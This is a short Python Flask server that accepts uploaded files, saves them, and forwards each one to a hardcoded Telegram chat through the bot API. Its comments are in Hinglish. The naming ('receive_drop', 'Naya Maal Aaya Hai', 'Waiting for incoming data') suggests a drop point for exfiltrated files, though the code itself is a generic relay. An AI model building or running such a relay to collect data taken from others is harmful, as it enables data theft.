import os
import requests
from flask import Flask, request, jsonify
from werkzeug.utils import secure_filename
from dotenv import load_dotenv

# .env file load karo (local testing ke liye)
load_dotenv()

app = Flask(__name__)

# --- CONFIGURATION ---
UPLOAD_FOLDER = 'received_files'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def send_to_telegram(file_path, filename):
    # Render ke environment se token uthao
    token = os.environ.get("BOT_TOKEN")
    user_id = "8614779308" # Tera ID

    # DEBUG: Logs mein check karne ke liye ki token aa raha hai ya nahi
    if not token:
        print("❌ ERROR: BOT_TOKEN environment variable nahi mila!")
        return
    
    # Token ki pehli 3 digits print karo (Security ke liye sirf 3)
    print(f"📡 Attempting to send using token starting with: {token[:3]}...")

    url = f"https://api.telegram.org/bot{token}/sendDocument"
    try:
        with open(file_path, 'rb') as file:
            payload = {'chat_id': user_id, 'caption': f"🚨 Naya Maal Aaya Hai!\nFile: {filename}"}
            files = {'document': file}
            response = requests.post(url, data=payload, files=files)
            
            if response.status_code == 200:
                print(f"✅ Telegram pe bhej diya: {filename}")
            else:
                # Ye line humein asli wajah batayegi
                print(f"❌ Telegram Error Details: {response.text}")
                
    except Exception as e:
        print(f"⚠️ Exception occurred: {e}")

@app.route('/')
def home():
    return "<h1>System Online</h1><p>Waiting for incoming data...</p>", 200

@app.route('/upload', methods=['POST'])
def receive_drop():
    if 'file' not in request.files:
        return jsonify({"error": "No file part"}), 400

    file = request.files['file']
    if file.filename == '':
        return jsonify({"error": "No selected file"}), 400

    if file:
        filename = secure_filename(file.filename)
        save_path = os.path.join(UPLOAD_FOLDER, filename)
        file.save(save_path)
        
        # Forward to Telegram
        send_to_telegram(save_path, filename)

        return jsonify({"status": "success", "message": "Data received and forwarded!"}), 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
